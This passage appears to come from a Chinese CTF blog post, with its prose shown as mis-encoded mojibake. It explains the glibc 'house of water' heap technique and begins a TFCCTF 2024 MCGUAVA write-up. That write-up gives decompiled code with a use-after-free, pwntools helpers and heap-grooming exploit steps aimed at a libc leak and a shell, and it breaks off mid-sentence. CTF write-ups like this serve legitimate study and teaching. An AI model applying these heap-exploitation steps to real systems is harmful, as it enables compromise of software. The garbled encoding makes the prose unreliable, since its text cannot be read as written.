åœ¨ç»“æŸçš„æ—¶å€™çš„ä¸‹ä¸ª chunk çš„ prev_size ä¸º 0x10000ï¼Œä¸” size çš„ issue ä½ä¸º 0ï¼ˆå› ä¸º unsorted bin ä¸­çš„å †å—éƒ½æ˜¯å·²ç»é‡Šæ”¾è¿‡çš„æœªä½¿ç”¨çš„ï¼‰<br>æ¥ä¸‹æ¥å°±æ˜¯å¯¹è¿™ä¸ª fake unsorted chunk è¿›è¡Œè£…ä¿®<br>å°†æ–­ç‚¹ä¸‹åœ¨ç¬¬ 57 è¡Œï¼Œæ­¤æ—¶ bin çš„ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æœŸé—´åšçš„æ“ä½œå°±æ˜¯å°†æœ€å¼€å§‹ç”³è¯·çš„ 7 ä¸ª 0x90 å¤§å°çš„ chunk ç»™é‡Šæ”¾æ‰ï¼ˆå°† size ä¸º 0x90 å¤§å°çš„ tcache é“¾è¡¨ç»™å¡«æ»¡ï¼Œç¡®ä¿åé¢ä¸‰ä¸ª 0x90 å¤§å°çš„å †å—ç»™é‡Šæ”¾åèƒ½å¤Ÿè¿›å…¥åˆ° unsorted binï¼‰ï¼Œç„¶ååœ¨ unsorted_start å’Œ unsorted_end ä¸Šæ–¹åˆ†åˆ«ä¼ªé€ ä¸€ä¸ªå°å †å—ç„¶åé‡Šæ”¾æ‰ï¼Œè¿™é‡Œä¸»è¦è®²è§£ä¸€ä¸‹å †å—çš„ä¼ªé€ <br>å¯¹äº unsorted_start ä¸Šæ–¹å †å—çš„ä¼ªé€ ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ unsorted_start-0x8 çš„åœ°æ–¹å¡«ä¸Š 0x31 æ¥å½“ä½œ fake chunk çš„ size ç„¶åç›´æ¥é‡Šæ”¾ï¼ˆè¿™ä¸ª size æ˜¯æœ‰è®²ç©¶çš„ï¼Œåé¢ä¼šè§£é‡Šåˆ°ï¼‰ï¼Œunstorted_end çš„åšæ³•ä¹Ÿç±»ä¼¼ï¼Œä¸è¿‡ fake chunk çš„å¤§å°ä¸º 0x20ã€‚åœ¨å°† fake chunk ç»™é‡Šæ”¾åç”±äºå †å—è¿›å…¥ tcache é“¾è¡¨å fd+8 çš„åœ°æ–¹ä¼šå¡«ä¸Šä¸€ä¸ª keyï¼Œè¿™ä¸ª key çš„ä½œç”¨æ˜¯ç”¨æ¥æ£€æµ‹ tcache ä¸Šæ˜¯å¦å‡ºç° double freeï¼Œè¿™ä¸ª key çš„å­˜åœ¨ç ´åäº†åŸå…ˆ unsorted_start å’Œ unsorted_end è¿™ 2 ä¸ªå †å—çš„ size ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»™äºˆæ¢å¤ï¼Œç¬¬ 50 å’Œ ç¬¬ 56 è¡Œçš„ä»£ç çš„ä½œç”¨å°±æ˜¯å¦‚æ­¤ã€‚<br>é‚£ä¹ˆä¼ªé€  2 ä¸ª fake chunk ç„¶å é‡Šæ”¾æ‰æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿ<br>æˆ‘ä»¬å›åˆ°å‰é¢ï¼Œå‰é¢è¯´è¿‡æ¥ä¸‹æ¥çš„æ“ä½œæ˜¯ä¸ºäº†å¯¹è¦è¿›å…¥ unsorted bin çš„  fake unsorted chunk è¿›è¡Œè£…ä¿®ï¼Œè€Œ unsorted bin æ˜¯å­˜åœ¨ fd å’Œ bk æŒ‡é’ˆçš„ï¼Œæ­¤æ—¶å†æ¥çœ‹çœ‹æˆ‘ä»¬çš„ fake unsorted chunk</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ° fake chunk çš„ fd å’Œ bk å·²ç»ç•™ä¸‹æˆ‘ä»¬å‰é¢ 2 ä¸ªé‡Šæ”¾çš„ fake chunk çš„ data åŒºåŸŸåœ°å€ï¼ŒåŒæ—¶è¿™ä¸ª 2 åœ°å€<br>ä¹Ÿåˆ†åˆ«æ˜¯ unsorted_end å’Œ unsorted_start è¿™ 2 ä¸ªå †å—çš„åœ°å€ï¼Œè¿™æ˜¯å› ä¸º 0x555555559090 è¿™ä¸ªåœ°å€ä¸º tcache_perthread_struct ç»“æ„ä½“ entries é“¾è¡¨çš„èµ·å§‹åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯æœ€åè¿›å…¥ 0x20 å¤§å°çš„ tcache é“¾è¡¨çš„å †å—çš„åœ°å€ï¼Œè€Œæˆ‘ä»¬æœ€åé‡Šæ”¾çš„ 2 ä¸ª fake chunk å¤§å°åˆ†åˆ«ä¸º 0x20 å’Œ 0x30ã€‚<br>æˆ‘ä»¬å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 63 è¡Œï¼ŒæœŸé—´è¿›è¡Œçš„æ“ä½œä¸ºï¼šä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_startã€‚bin çš„ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ¥ä¸‹æ¥æˆ‘ä»¬çš„æ“ä½œæ˜¯è¦è®©æˆ‘ä»¬ä¸€å¼€å§‹åœ¨ tcache_perthread_struct ä¸­ä¼ªé€ çš„å †å—é“¾å…¥ unsorted binï¼Œè¿™é‡Œçš„æ“ä½œæ˜¯å°† unsorted_middle ç»™æ›¿æ¢ä¸º fake chunkã€‚å›åˆ°æˆ‘ä»¬ fake chunk çš„é‚£å¼ å›¾ç‰‡ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° fake chunk çš„fd æŒ‡é’ˆå·²ç»æŒ‡å‘ unsorted_endï¼Œbk æŒ‡é’ˆå·²ç»æŒ‡å‘ unsorted_startï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„æ“ä½œå°±æ˜¯ä»¤ unsorted_start çš„ fd æŒ‡é’ˆæŒ‡å‘ fake unsorted chunkï¼Œunsorted_end çš„ bk æŒ‡é’ˆæŒ‡å‘ fake unsorted chunk å³å¯å®Œæˆ unsorted bin ä¸Šå †å—æ›¿æ¢æ“ä½œ<br>å°†æ–­ç‚¹ä¸‹åœ¨ç¬¬ 67 è¡Œï¼ŒæœŸé—´çš„æ“ä½œå°±æ˜¯è¿›è¡Œä¸Šè¿°çš„æŒ‡é’ˆæ›¿æ¢æ“ä½œï¼Œæœ€åçš„ bin ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸå°† unsorted_middle ç»™æ›¿æ¢ä¸º fake chunkã€‚<br>æ¥ä¸‹æ¥å°±æ˜¯è¦è®© fake unsorted chunk çš„ fd æŒ‡é’ˆå’Œ bk æŒ‡é’ˆå‡ºç° libc çš„åœ°å€ï¼Œå½“æˆ‘ä»¬ç”³è¯·ä¸€ä¸ª chunk çš„size å°äº 0x10000 ä¸”æ— å¯¹åº” size çš„ chunk åœ¨tcache å’Œå…¶ä»– bin ä¸­æ—¶ï¼Œä¼šå…ˆå¯¹ unsroted bin è¿›è¡Œéå†ï¼Œç„¶å unsorted_end å’Œ unsorted_start é€å…¥ smallbin ä¸­ï¼Œå°† fake chunk é€å…¥ largebin ä¸­ï¼Œæ­¤æ—¶ fake chunk çš„ fd å’Œ bk æŒ‡é’ˆæŒ‡å‘ libc çš„ç›¸å…³åœ°å€ï¼Œæ­¤æ—¶å†åœ¨ fake unsorted chunk ä¸­åˆ‡å‰²å‡ºåˆé€‚å¤§å°çš„å †å—è¿›è¡Œåˆ†é…ã€‚how2heap çš„ä»£ç ä¸­é€‰æ‹©ç”³è¯·çš„å †å—å¤§å°ä¸º 0x290ï¼Œå…¶å®ç”³è¯·çš„å¤§å°æ»¡è¶³æˆ‘ä¸Šé¢æ‰€è¯´çš„æ¡ä»¶å³å¯ã€‚<br>å°†æ–­ç‚¹ä¸‹åˆ° 70 è¡Œï¼Œæ­¤æ—¶å·²ç»å®Œæˆäº†å †å—çš„ç”³è¯·ï¼ŒæŸ¥çœ‹ tcache_perthread_struct ç»“æ„ä½“å’Œ bin çš„ç»“æ„ï¼š</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å·²ç»ç»™è¸©ä¸Š libc ä¸Šçš„åœ°å€â¬†ï¸</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥è¿›è¡Œ libc ä¸Šå†…å­˜çš„åˆ†é…ï¼Œè¿™ä¹Ÿæ˜¯ house of water çš„æ‰€æœ‰å†…å®¹ï¼Œåç»­çš„æ”»å‡»å°±çœ‹æ¯ä¸ªäººçš„éœ€æ±‚äº†ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å¯ä»¥çœ‹åˆ° house of water èƒ½å¤Ÿåœ¨æ²¡æœ‰å†…å­˜æ³„éœ²çš„æƒ…å†µä¸‹åœ¨ tcache é“¾ä¸Šç•™ä¸‹ libc çš„ç›¸å…³åœ°å€ã€‚åœ¨ä¿®æ”¹ unsorted_start å’Œ unsroted_end çš„æŒ‡é’ˆä½¿ fake unsorted chunk é“¾å…¥unosorted chunk çš„è¿™æ­¥ä¸­æˆ‘ä»¬éœ€è¦è¿›è¡Œä¸€æ­¥å°çˆ†ç ´ï¼Œå› ä¸ºæˆ‘ä»¬æ¯æ¬¡ä¿®æ”¹ä¸èƒ½åªè¦†ç›–åœ°å€çš„ä½3ä½ï¼Œè€Œæ˜¯ä½4ä½ï¼Œåœ¨å¼€å¯äº† alsr çš„ç¯å¢ƒä¸‹ä»ç¬¬ 4 ä½å¼€å§‹çš„åœ°å€éƒ½æ˜¯éšæœºçš„ã€‚<br>æˆ‘è®¤ä¸º house of water æ”»å‡»çš„å…³é”®æ˜¯ä¼ªé€ å¹¶é‡Šæ”¾é‚£ 2 ä¸ªå¤§å°åˆ†åˆ«ä¸º 0x20 å’Œ 0x30 çš„å †å—ï¼Œæƒ³äº†æƒ³è¿™ä¸ªä¼ªé€ åœ¨ pwn é¢˜ä¸­å¹¶ä¸ç®€å•ã€‚<br>å¸Œæœ›è¯»è€…èƒ½å¤Ÿè‡ªå·±è°ƒè¯•ä¸€é how2heap é‡Œé¢çš„ä»£ç ï¼Œç›¸ä¿¡ä½ ä»¬ä¸€å®šä¼šæœ‰æ–°çš„æ”¶è·ã€‚</p><h1 id="TFCCTF-2024-MCGUAVA"><a href="#TFCCTF-2024-MCGUAVA" class="headerlink" title="TFCCTF 2024 MCGUAVA"></a>TFCCTF 2024 MCGUAVA</h1><p>è¿™é“é¢˜ç›®éœ€è¦ç”¨åˆ° house of waterï¼Œå½“æ—¶å¥½åƒæœ‰ 7 è§£äº†ï¼Œå¯æ˜¯æˆ‘è¿˜æ²¡åšå‡ºæ¥ï¼Œå¤ªèœäº†ğŸ˜­ğŸ˜­ğŸ˜­</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å½“æ—¶çš„æƒ³æ³•æ˜¯è®©åŒä¸€ä¸ª chunk åŒæ—¶è¿›å…¥ unsortedbin å’Œ smallbin ä»¥æ­¤æ¥ç•™ä¸‹ libc çš„åœ°å€ï¼Œå¯æ˜¯æäº†åŠå¤©ä»€ä¹ˆéƒ½æ²¡æå‡ºæ¥ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰å¸ˆå‚…æ˜¯ç”¨è¿™ç§æ–¹æ³•åšå‡ºæ¥çš„ğŸ¤”<br>é¢˜ç›®å¯ä»¥ä» r3kapig æˆ˜é˜Ÿçš„æ¯”èµ›é¢˜åº“ä¸­æ‰¾åˆ°ï¼š<a href="https://r3kapig-not1on.notion.site/TFC-CTF-2024-Jeopardy-bc81d99eb2064c8db48faf5bc5af50ee">TFC CTF 2024(Jeopardy) (notion.site)</a><br>è¿™é¢˜é™„ä»¶é‡Œç»™çš„ dockerfile é‡Œå†™çš„è¿œç¨‹ç¯å¢ƒä¸º ubuntu:24.10ï¼Œæˆ‘å¯»æ€ç€è¿™ä¸ä¹Ÿæ‰ 8 æœˆå˜›ï¼Œæ€ä¹ˆéƒ½æœ‰ 10 äº†ğŸ¤”<br>è¿™é‡Œæˆ‘åšäº†ä¸ªå°å·æ‡’ï¼Œlibc æˆ‘ç”¨äº†æœ¬åœ°çš„ 2.35ï¼Œä¸è¿‡å¤§å·®ä¸å·®ï¼Œæœ€ç»ˆæ€è·¯è¿˜æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±ä¸€ä¸ªåç§»ä¸åŒè€Œå·²<br>ç”±äºé¢˜ç›®ä»£ç é‡æ¯”è¾ƒå°‘ï¼Œè¿™é‡Œå°±ç›´æ¥è´´ä¸Šæ¥</p><h3 id="idaä¼ªä»£ç "><a href="#idaä¼ªä»£ç " class="headerlink" title="idaä¼ªä»£ç "></a>idaä¼ªä»£ç </h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    guava_gius[i] = <span class="number">0LL</span>;</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      guava();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      gius();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="guava"><a href="#guava" class="headerlink" title="guava"></a>guava</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">guava</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( cnt_guavas &gt; <span class="number">255</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how many guavas: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">1791</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guavset: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v2 - <span class="number">2</span> &lt;= v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guavas: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4[v3], v2 - v3);</span><br><span class="line">  v0 = cnt_guavas++;</span><br><span class="line">  guava_gius[v0] = v4;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="gius"><a href="#gius" class="headerlink" title="gius"></a>gius</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gius</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guava no: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)guava_gius[v1]);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¿™æ˜¯ä¸€ä¸ªå¾ˆå…¸å‹çš„èœå•ç¨‹åºï¼Œå®ç°äº†å †å—çš„ç”³è¯·å’Œé‡Šæ”¾åŠŸèƒ½ï¼Œæ²¡æœ‰ç¼–è¾‘å’Œå’Œæ‰“å°åŠŸèƒ½ã€‚æ¼æ´ååˆ†çš„æ˜æ˜¾ï¼Œå°±æ˜¯ gius åœ¨é‡Šæ”¾å †å—åå¹¶æ²¡æœ‰å°†ç›¸åº”çš„æŒ‡é’ˆç½® 0ï¼Œè¿™é‡Œå­˜åœ¨ UAF æ¼æ´ã€‚ç¨‹åºæœ€å¤šå¯ä»¥ç”³è¯· 0x100 ä¸ªå †å—ï¼Œæ¯ä¸ªå †å—æœ€å¤§ä¸º 0x1791ï¼Œè¿™ä¸æ‘†æ˜ç€è®©æˆ‘ä»¬ä½¿ç”¨ house of water è¿›è¡Œæ”»å‡»å˜›ï¼ŸğŸ˜‡<br>è¿™é‡Œå…ˆè´´ä¸Šæˆ‘çš„äº¤äº’è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;*&gt;&#x27;</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index=<span class="number">0</span>,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;how many guavas:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavset:&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavas:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guava no:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬çš„æ•´ç†æ€è·¯æ˜¯åˆ©ç”¨ house of water å®ç° stdout ä¸Šçš„å†…å­˜åˆ†é…ï¼Œç„¶åé€šè¿‡ stdout æ³„éœ²å‡º libc çš„åœ°å€ï¼Œæœ€åé€šè¿‡ä¼ªé€  io file æ¥ getshellã€‚<br>æ—¢ç„¶ä¸Šé¢è¯´åˆ° house of water çš„å…³é”®æ˜¯ä¼ªé€  unsorted_start å’Œ unsroted_end ä¸Šæ–¹çš„2ä¸ªå°å †å—ï¼Œè¿™é‡Œå°±å…ˆè¿›è¡Œè¿™ä¸€æ­¥ï¼Œå·²ç» unsorted_start ä¸ºä¾‹</p><h3 id="è·å–å †å—ç´¢å¼•"><a href="#è·å–å †å—ç´¢å¼•" class="headerlink" title="è·å–å †å—ç´¢å¼•"></a>è·å–å †å—ç´¢å¼•</h3><p>å› ä¸ºæˆ‘ä»¬çš„å° fake chunk å’Œ unsorted_start æœ€ç»ˆéƒ½æ˜¯è¦ç»™ free æ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆè·å¾—ä»–çš„ç´¢å¼•ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯å †å—åˆ‡å‰²æ³•ï¼Œé€šè¿‡è®©ä¸€ä¸ªå·¨å¤§çš„å †å—è¿›å…¥ unsorted binï¼Œç„¶åæŒ‰ç…§ä¸€å®šçš„å¤§å°ç”³è¯· 2 ä¸ªå †å—å‡ºæ¥è·å–ç´¢å¼•ï¼Œç„¶åå†å°†ç”³è¯·å‡ºæ¥çš„å †å—é‡Šæ”¾æ‰ï¼Œä½¿å…¶å†æ¬¡å’Œåˆå¹¶è¿›å…¥ unsorted binï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä¸€å…±ç”³è¯·äº† 4 ä¸ªå¤§å †å—ï¼Œå…¶ä¸­ç¬¬ 4 ä¸ªå †å—æ˜¯ç”¨äºé˜²æ­¢ unsorted bin ä¸ top chunk è¿›è¡Œåˆå¹¶ã€‚å¯èƒ½æœ‰äººä¼šé—®ä¸ºä»€ä¹ˆæˆ‘è¦ç”³è¯·è¿™ä¹ˆå¤§çš„å †å—æ¥é˜²æ­¢åˆå¹¶ï¼Œå…¶å®æˆ‘æ˜¯ä¸ºäº†å‡å°‘å¯¹ tcache çš„å½±å“ï¼Œå› ä¸º house of water åçš„æ”»å‡»å°†ä¼šåœ¨ tcache_perthread_struct ä¸­è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘å°½å¯èƒ½çš„è®©æ›´å°‘çš„ chunk è¿›å…¥ tcacheã€‚è¿™é‡Œè¿›è¡Œäº† fake 0x30 å’Œ unsorted_start 2 ä¸ªå †å—ç´¢å¼•çš„è·å–ï¼Œå¹¶å°† fake 0x30 